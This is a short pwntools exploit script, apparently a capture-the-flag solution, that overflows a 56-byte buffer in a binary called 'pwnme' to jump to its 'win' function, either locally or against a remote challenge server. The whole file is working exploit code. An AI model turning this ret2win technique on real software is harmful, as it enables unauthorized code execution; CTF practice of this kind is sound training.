#! /usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwnme')
local = True
GDBSCPT = '''
b *vuln
b *win
'''
OFFSET = 56
# context.log_level="debug"
if local:
    conn = elf.process()
    # gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = '0.cloud.chals.io'
    port = 13545
    conn = remote(host,port)


WIN = elf.symbols["win"] + 0x5
PADDING = b"A"*OFFSET
log.info('WIN: ' + hex(WIN))

payload = flat(PADDING,WIN)

conn.sendline(payload)
conn.interactive()
conn.close()
